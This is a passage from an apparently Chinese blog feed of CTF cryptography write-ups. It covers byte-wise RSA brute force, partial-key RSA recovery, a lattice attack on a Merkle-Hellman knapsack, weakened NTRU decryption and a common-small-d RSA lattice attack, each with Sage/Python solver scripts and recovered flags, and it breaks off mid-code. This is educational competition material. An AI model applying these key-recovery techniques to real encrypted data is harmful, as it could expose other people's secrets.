        <content type="html"><![CDATA[<h3 id="easyrsa">EasyRSA</h3><h4 id="题解分析">[题解分析]</h4><p>Cry签到题，逐字节的RSA，且<code>assert(e &lt; 20000)</code>，爆破即可</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = [...]</span><br><span class="line">e = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">20000</span>):</span><br><span class="line">    <span class="keyword">if</span> pow(ord(<span class="string">'f'</span>), _, n) == c[<span class="number">0</span>]:</span><br><span class="line">        e = _</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># e = 11299</span></span><br><span class="line">flag_char = [ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>]</span><br><span class="line"><span class="keyword">for</span> c_char <span class="keyword">in</span> c[<span class="number">5</span>:<span class="number">-1</span>]:</span><br><span class="line">    <span class="keyword">for</span> m_char <span class="keyword">in</span> flag_char:</span><br><span class="line">        <span class="keyword">if</span> pow(m_char, e, n) == c_char:</span><br><span class="line">            print(chr(m_char), end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># caf94ef5f8400ae920c0bd79489f3791</span></span><br></pre></td></tr></table></figure><h3 id="hardrsa">HardRSA</h3><h4 id="题解分析-1">[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">510</span>)</span><br><span class="line">q = getPrime(<span class="number">510</span>)</span><br><span class="line">r = getPrime(<span class="number">510</span>)</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">m = bytes_to_long(os.urandom(<span class="number">30</span>) + flag)</span><br><span class="line">n = p * q * r</span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>))</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(n // p)</span><br><span class="line">print(p)</span><br><span class="line">print(c)</span><br><span class="line">print(hex(d % (<span class="number">1</span> &lt;&lt; <span class="number">540</span>)))</span><br></pre></td></tr></table></figure><p><span class="math inline">\(k(p-1)\rightarrow k&#39;,qr\rightarrow n&#39;,q+r\rightarrow s\)</span></p><p><span class="math inline">\(ed_{0}\equiv 1+k&#39;(n&#39;-s+1)\quad mod\ 2^{d_{0}.nbits()}\quad (1)\)</span></p><p><span class="math inline">\(q^{2}-sq+n&#39;\equiv 0\quad mod\ 2^{d_{0}.nbits()}\quad (2)\)</span></p><p><span class="math inline">\(q\cdot (1),k&#39;\cdot (2)\)</span>，联立可得，<span class="math inline">\((ed_{0}-1-k&#39;n&#39;-k&#39;)q+k&#39;q^{2}+k&#39;n&#39;\equiv 0\quad mod\ 2^{d_{0}.nbits()}\)</span></p><p>即求解同余方程可得<strong>q的低size(d0)位</strong>，本来是个partial d的coppersmith问题，但因为step1求解同余方程后得到的q已是完整的q，所以无需后续的copper</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n, p)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">        k_dot = k * (p - <span class="number">1</span>)</span><br><span class="line">        results = solve_mod([e * d0 * X - k_dot * X * (n - X + <span class="number">1</span>) + k_dot * n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            q = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">n = ... <span class="comment"># q * r</span></span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line">d0 = </span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">kbits = d0.nbits()</span><br><span class="line">q = find_p(d0, kbits, e, n, p)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (n // q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">print(bytes.fromhex(hex(pow(c, d, p * n))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'\xf3\xaa\x03~\xaesZ?\xb5\x84\x0b\t\xb7-\xd8\xa8\xca\x80\x18\xd4\x9eVm6\x8bU\xb6\xfb`\x8eflag&#123;6809781d08e120627e623dcdafe26b8a&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="alicehomework">AliceHomework</h3><h4 id="题解分析-2">[题解分析]</h4><p>Merkle-Hellman的背包系统，Shamir's Attack没自己实现过- -照例作格基约化</p><p>303维的子集和问题，已知明文flag{...}可以降维到256维，规模还是略大（但是赛后得知到这一步以后直接LLL能出，啊这）</p><p>由于flag内芯是32位小写md5，而0~f的二进制编码均为<span class="math inline">\(0x1xxxxx\)</span>格式，因此能继续降维至256-32*2=192维</p><p>最后常规BKZ即可</p><h4 id="exp-2">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pubkey = [...] <span class="comment"># len(pubkey) == 303</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">prefix = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(bytes_to_long(<span class="string">b'flag&#123;'</span>))[<span class="number">2</span>:]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(prefix)):</span><br><span class="line">    c -= prefix[i] * pubkey[i]</span><br><span class="line"></span><br><span class="line">suffix = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(ord(<span class="string">'&#125;'</span>))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)]</span><br><span class="line">n = len(pubkey)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    c -= pubkey[n - <span class="number">8</span> + i] * suffix[i]</span><br><span class="line">    </span><br><span class="line">elements = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(prefix), len(pubkey) - <span class="number">8</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="comment">#c -= 0 * pubkey[i]</span></span><br><span class="line">    elements.append(pubkey[i + <span class="number">1</span>])</span><br><span class="line">    c -= <span class="number">1</span> * pubkey[i + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">8</span>):</span><br><span class="line">        elements.append(pubkey[i + j])</span><br><span class="line">        </span><br><span class="line">n = len(elements)</span><br><span class="line">A = Matrix(ZZ, n + <span class="number">1</span>, n + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    A[i, <span class="number">0</span>] = elements[i]</span><br><span class="line">    A[i, i + <span class="number">1</span>] = <span class="number">2</span></span><br><span class="line">A[n, <span class="number">0</span>] = c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">    A[n, i] = <span class="number">1</span></span><br><span class="line">AL = A.BKZ()</span><br><span class="line">mid = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> AL:</span><br><span class="line">    <span class="keyword">if</span> all(line[i] == <span class="number">1</span> <span class="keyword">or</span> line[i] == <span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            line = -line</span><br><span class="line">        mid = line[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mid_str = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> mid:</span><br><span class="line">    <span class="keyword">if</span> _ == <span class="number">-1</span>:</span><br><span class="line">        mid_str += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mid_str += <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    flag += <span class="string">'0'</span></span><br><span class="line">    flag += mid_str[j]</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    flag += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        flag += mid_str[j]</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">print(long_to_bytes(int(flag, <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># b'8130e8c14fe4df06558c0a7ebf06f272'</span></span><br></pre></td></tr></table></figure><h3 id="polycrypto">PolyCrypto</h3><h4 id="题解分析-3">[题解分析]</h4><p>NTRU CryptoSystem，赛中来不及- -</p><p>非标准的NTRU，且私钥已给出，直接decrypt即可</p><p><strong>Enc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">I = Integers(q)</span><br><span class="line">R = PolynomialRing(I, <span class="string">"x"</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">S = R.quotient(x ^ N - <span class="number">1</span>, <span class="string">"x"</span>)</span><br><span class="line">F = S(randomseq(N)) <span class="comment"># 本题randomseq无标准NTRU中的参数d...就直接[randint(-1, 1) for _ in range(N)]...很迷</span></span><br><span class="line">f = p * F + <span class="number">1</span></span><br><span class="line">z = f ^ <span class="number">-1</span></span><br><span class="line">g = S(randomseq(N))</span><br><span class="line">h = p * z * g</span><br><span class="line"><span class="comment"># h =&gt; pubkey ; f =&gt; prikey</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(key, block ,S)</span>:</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="comment"># transform number to polynomial</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(N):</span><br><span class="line">        out.append(block % <span class="number">3</span> - <span class="number">1</span>)</span><br><span class="line">        block -= block % <span class="number">3</span></span><br><span class="line">        block //= <span class="number">3</span></span><br><span class="line">    cipher = S(randomseq(N)) * key + S(out) <span class="comment"># c = r * h + m</span></span><br><span class="line">    <span class="keyword">return</span> list(cipher)</span><br></pre></td></tr></table></figure><p><span class="math inline">\(c=r*h+m=r*p*z*g+m\quad (mod\ q)\)</span></p><p><span class="math inline">\(a=f*c=r*p*g+f*m\quad (mod\ q)\)</span></p><p>标准的NTRU解密基于该步骤的<span class="math inline">\(rpg+fm\)</span>在Zmod(q)与在ZZ上等价，否则在<span class="math inline">\(a*inv\_f\)</span>后得到的结果非m</p><p>而本题randomseq是个自写的函数...汉明重量不能保证上界，且<span class="math inline">\(F=randpoly,f=p*F+1\)</span>，因此标准decrypt失败，再次化简上式可知，</p><p><span class="math inline">\(a=f*c=r*p*g+p*m*F+m\)</span>，因此在Zmod(p)上即为m</p><h4 id="exp-3">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">61</span></span><br><span class="line">q = <span class="number">5039</span></span><br><span class="line">p = <span class="number">11</span></span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line">h = R([...])</span><br><span class="line">f = R([...])</span><br><span class="line">c = [[...], [...], ...]</span><br><span class="line">c = [R(_) <span class="keyword">for</span> _ <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coef2num</span><span class="params">(coefs)</span>:</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(coefs)):</span><br><span class="line">        num += coefs[i] * (<span class="number">3</span> ** i)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, f)</span>:</span></span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="comment"># m = balance_mod(a * invert_mod_prime(f, p), p)</span></span><br><span class="line">    m = balance_mod(a, p)</span><br><span class="line">    coefs = [_ + <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> m]</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(coef2num(coefs))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> c:</span><br><span class="line">    flag += decrypt(_, f)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># b'59d34a385e1b59c977eea74e92e0d9dc'</span></span><br></pre></td></tr></table></figure><h3 id="more">More</h3><p>Fianl是内网综合渗透，队友带飞，舒适.jpg</p><p><img src= "/img/loading.gif" data-src="/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/5c925fcbbe85298b.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(SCTF2020) - Crypto</title>
      <link href="/2020/07/06/WriteUp-SCTF2020-Crypto/"/>
      <url>/2020/07/06/WriteUp-SCTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="preface">Preface</h3><p>虽说依旧是paper题- -但出题人基本没做隐藏or变换（coin考点crash，然后回来骂骂咧咧.jpg，笑死</p><h3 id="rsa">RSA</h3><h4 id="题解分析">[题解分析]</h4><p><strong>Encode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">flag = int(<span class="string">'SCTF&#123;*******************&#125;'</span>.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">d = getPrime(randint(<span class="number">380</span>, <span class="number">385</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = inverse(d, fn)</span><br><span class="line">    c = pow(flag, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'e'</span>+str(_)+str(<span class="string">'='</span>)+hex(e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'n'</span>+str(_)+str(<span class="string">'='</span>)+hex(n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c'</span>+str(_)+str(<span class="string">'='</span>)+hex(c)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">350</span></span><br></pre></td></tr></table></figure><p><strong>Attack on r (<span class="math inline">\(e_{i},n_{i},c_{i}\)</span>)s with Common d(<span class="math inline">\(d&lt;N_{r}^{\delta}\)</span>)</strong></p><p><a href="https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf" target="_blank" rel="noopener">https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf</a></p><p><span class="math inline">\(N_{1}&lt;N_{2}&lt;...&lt;N_{r}&lt;2N_{1}\)</span> with Common <span class="math inline">\(d&lt;N_{r}^{\delta}\)</span>. And all each modulus is balanced so that <span class="math inline">\(s=p+q-1&lt;\frac{3\sqrt{2}}{2}N_{r}^{1/2}&lt;3N^{1/2}.\)</span> Then we have r equations: <span class="math inline">\(e_{i}d-N_{i}k_{i}=1-k_{i}s_{i}\)</span>.</p><p>Let vector A = <span class="math inline">\([d,k_{1},k_{2}...,k_{r}]\)</span>, <span class="math inline">\(M=ceil(N_{r}^{1/2})\)</span>, matrix B = <span class="math display">\[\left[\begin{matrix}M &amp; e_{1} &amp; e_{2} &amp; ... &amp; e_{r}\\0 &amp; -N_{1} &amp; 0 &amp; ... &amp; 0\\0 &amp; 0 &amp; -N_{2} &amp; ... &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ...\\0 &amp; 0 &amp; 0 &amp; ... &amp; -N_{r}\\\end{matrix}\right]\]</span> <span class="math inline">\(C=AB=[dM,1-k_{1}s_{1},1-k_{2}s_{2},...,1-k_{r}s_{r}]\)</span>.</p><p>转求向量C满足Lattice(B)的Minkowski界的条件（满足即转化为SVP）：</p><p><span class="math inline">\(\|C\|&lt;N_{r}^{\frac{1}{2}+\delta}\sqrt{1+9r}\)</span>.</p><p><span class="math inline">\(\sqrt{r+1}det(B)^{\frac{1}{r+1}}&gt;\sqrt{r+1}N_{1}^{\frac{r+\frac{1}{2}}{r+1}}&gt;\sqrt{r+1}(\frac{N_{r}}{2})^{\frac{r+\frac{1}{2}}{r+1}}\)</span>.</p><p><strong>Then we wanna <span class="math inline">\(N_{r}^{\frac{1}{2}+\delta}\sqrt{1+9r}&lt;\sqrt{r+1}(\frac{N_{r}}{2})^{\frac{r+\frac{1}{2}}{r+1}}\Leftrightarrow N_{r}^{\delta-\frac{r}{2r+2}}&lt;\frac{\sqrt{\frac{r+1}{9r+1}}}{2^{\frac{2r+1}{2r+2}}}\)</span>.</strong></p><p>Cuz <span class="math inline">\(r\geq 1\)</span>, the right side <span class="math inline">\(&gt;\frac{1}{6}\)</span>. So if <span class="math display">\[\delta&lt;\frac{r}{2r+2}-log_{N_{r}}(6)\]</span> the Minkowski satisfies.</p><p>作本题的简单估计，<span class="math inline">\(bound\approx\frac{3}{8}-\frac{1}{400}&gt;\frac{380}{1024}\)</span>.</p><p>size(d) = 385时，从原理上有一定失败几率，但能很容易交互出size(d)满足Minkowski界的d. (e.g. size(d)=380)</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">e = [...]</span><br><span class="line">n = [...]</span><br><span class="line">c = [...]</span><br><span class="line">M = isqrt(max(n))</span><br><span class="line">A = Matrix(ZZ, len(e) + <span class="number">1</span>, len(e) + <span class="number">1</span>)</span><br><span class="line">A[<span class="number">0</span>] = [M] + e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">    A[i + <span class="number">1</span>, i + <span class="number">1</span>] = -n[i]</span><br><span class="line">AL = A.BKZ()</span><br><span class="line">d = AL[<span class="number">0</span>, <span class="number">0</span>] // M</span><br><span class="line">print(bytes.fromhex(hex(pow(c[<span class="number">0</span>], d, n[<span class="number">0</span>]))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'SCTF&#123;673ff064da31c0d7aee56884b01a09&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="lattice">Lattice</h3><h4 id="题解分析-1">[题解分析]</h4><p>考察<strong>Attack on NTRU Cryptosystem</strong></p><p>NTRU - Nth Degree Truncated Polynomial Ring Units</p><p><span class="math inline">\(R=Z[x]/(x^{n}-1)\)</span>: <strong>quotient</strong></p><ul><li><p><span class="math inline">\(0^{th}\)</span> step. Variable and Func prepared</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">d = </span><br><span class="line">q = </span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># return an n-coef polynomial where exactly d coef are nonzero(±1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_poly</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(d &lt;= n)</span><br><span class="line">    result = n * [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(d):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = randrange(n)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        result[r] = <span class="number">1</span> - <span class="number">2</span> * randrange(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> R(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># balance coef between -q/2 and q/2 (mod q)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># return h which f*h=p*u+1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># return h which f*h=q*u+1 (q=2^m, m\in N*)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_powerof2</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(q.is_power_of(<span class="number">2</span>))</span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = balance_mod(f * g, q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = balance_mod(g * (<span class="number">2</span> - r), q)</span><br></pre></td></tr></table></figure></li><li><p><span class="math inline">\(1^{st}\)</span> step. Key Generation</p><p>Select a prime p and genkey with the func below,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = random_poly()</span><br><span class="line">            fp = invert_mod_prime(f, p)</span><br><span class="line">            fq = invert_mod_powerof2(f, q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    g = 